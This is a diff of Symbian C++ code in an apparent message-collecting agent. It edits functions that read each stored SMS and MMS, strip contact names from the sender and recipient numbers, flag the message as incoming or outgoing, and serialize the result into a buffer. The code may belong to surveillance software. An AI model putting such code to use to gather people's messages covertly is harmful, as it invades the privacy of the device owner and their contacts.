@@ -398,32 +398,73 @@ HBufC8* CAgentMessages::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMs
 	
 	iSmsMtm->SwitchCurrentEntryL(aMsvId);
 	iSmsMtm->LoadMessageL();
-	// insert sender 
-	typeAndLen = EStringFrom;
-	typeAndLen += iSmsMtm->SmsHeader().FromAddress().Size();
-	ptrData = (TUint8 *)iSmsMtm->SmsHeader().FromAddress().Ptr();
-	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
-	buffer->InsertL(buffer->Size(), ptrData, iSmsMtm->SmsHeader().FromAddress().Size());
 	// insert recipients:
 	const MDesC16Array &array = iSmsMtm->AddresseeList().RecipientList();
 	TInt count = array.MdcaCount();
+	if(count == 0) //Symbian devices have To: empty when incoming messages
+		{
+		serializedMsg.iFlags = MESSAGE_INCOMING;
+		}
 	CBufBase* buf = CBufFlat::NewL(50);
 	CleanupStack::PushL(buf);
 	_LIT(KVirgola,",");
 	for(TInt i = 0; i<count; i++)
 		{
-		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
-		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
+		// if the number is in the addressbook, we need to delete associated name from address
+		TBuf<124> tmp;
+		tmp.Copy(array.MdcaPoint(i));
+		TInt pos = tmp.Find(_L("<"));
+		if(pos != KErrNotFound)
+			{
+			tmp.Copy(tmp.Mid(pos+1));
+			pos = tmp.Find(_L(">"));
+			if(pos!=KErrNotFound)
+				{
+				tmp.Copy(tmp.Left(pos));
+				}
+			}
+		ptrData = (TUint8 *)tmp.Ptr();
+		buf->InsertL(buf->Size(),ptrData,tmp.Size() );
 		if(i < (count-1))
 			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
-										
 		}
 	typeAndLen = EStringTo;
 	typeAndLen += buf->Size();
 	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
 	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
 	CleanupStack::PopAndDestroy(buf);																					
-	
+	// insert sender
+	// if this is an outgoing sms, from and to have the same phone number, so we have to put NULL into from
+	typeAndLen = EStringFrom;
+	if((serializedMsg.iFlags & MESSAGE_INCOMING))
+		{
+		//incoming
+		// if the number is in the addressbook, we need to delete associated name from address
+		TBuf<124> tmp;
+		tmp.Copy(iSmsMtm->SmsHeader().FromAddress());
+		TInt pos = tmp.Find(_L("<"));
+		if(pos != KErrNotFound)
+			{
+			tmp.Copy(tmp.Mid(pos+1));
+			pos = tmp.Find(_L(">"));
+			if(pos!=KErrNotFound)
+				{
+				tmp.Copy(tmp.Left(pos));
+				}
+			}
+		typeAndLen += tmp.Size();
+		ptrData = (TUint8 *)tmp.Ptr();
+		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+		buffer->InsertL(buffer->Size(), ptrData, tmp.Size());
+		}
+	else
+		{
+		//outgoing
+		ptrData = (TUint8 *)iSmsMtm->SmsHeader().FromAddress().Ptr();
+		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+		buffer->InsertL(buffer->Size(), ptrData, 0);
+		}
+		
 	// insert body
 	// this code retrieves body larger than 256 characters:
 	// http://discussion.forum.nokia.com/forum/showthread.php?146721-how-to-get-FULL-message-body-for-SMS/page2&highlight=mime+body
@@ -643,10 +684,36 @@ HBufC8* CAgentMessages::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMs
 	
 	// insert sender 
 	typeAndLen = EStringFrom;
-	typeAndLen += iMmsMtm->Sender().Size();
-	ptrData = (TUint8 *)iMmsMtm->Sender().Ptr();
-	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
-	buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->Sender().Size());
+	if(iMmsMtm->Sender().Size()>0)
+		{
+		//Symbian devices have From: empty when outgoing messages
+		serializedMsg.iFlags = MESSAGE_INCOMING;
+		//we have to delete associated name if present
+		TBuf<124> tmp;
+		tmp.Copy(iMmsMtm->Sender());
+		TInt pos = tmp.Find(_L("<"));
+		if(pos != KErrNotFound)
+			{
+			tmp.Copy(tmp.Mid(pos+1));
+			pos = tmp.Find(_L(">"));
+			if(pos!=KErrNotFound)
+				{
+				tmp.Copy(tmp.Left(pos));
+				}
+			}
+		typeAndLen += tmp.Size();
+		ptrData = (TUint8 *)tmp.Ptr();
+		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+		buffer->InsertL(buffer->Size(),ptrData,tmp.Size() );
+		}
+	else
+		{
+		typeAndLen += iMmsMtm->Sender().Size();
+		ptrData = (TUint8 *)iMmsMtm->Sender().Ptr();
+		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+		buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->Sender().Size());
+		}	
+		
 	// insert recipients:
 	const MDesC16Array &array = iMmsMtm->AddresseeList().RecipientList();
 	TInt count = array.MdcaCount();
@@ -655,11 +722,23 @@ HBufC8* CAgentMessages::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMs
 	_LIT(KVirgola,",");
 	for(TInt i = 0; i<count; i++)
 		{
-		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
-		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
+		// if the number is in the addressbook, we need to delete associated name from address
+		TBuf<124> tmp;
+		tmp.Copy(array.MdcaPoint(i));
+		TInt pos = tmp.Find(_L("<"));
+		if(pos != KErrNotFound)
+			{
+			tmp.Copy(tmp.Mid(pos+1));
+			pos = tmp.Find(_L(">"));
+			if(pos!=KErrNotFound)
+				{
+				tmp.Copy(tmp.Left(pos));
+				}
+			}
+		ptrData = (TUint8 *)tmp.Ptr();
+		buf->InsertL(buf->Size(),ptrData,tmp.Size() );
 		if(i < (count-1))
 			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
-									
 		}
 	typeAndLen = EStringTo;
 	typeAndLen += buf->Size();
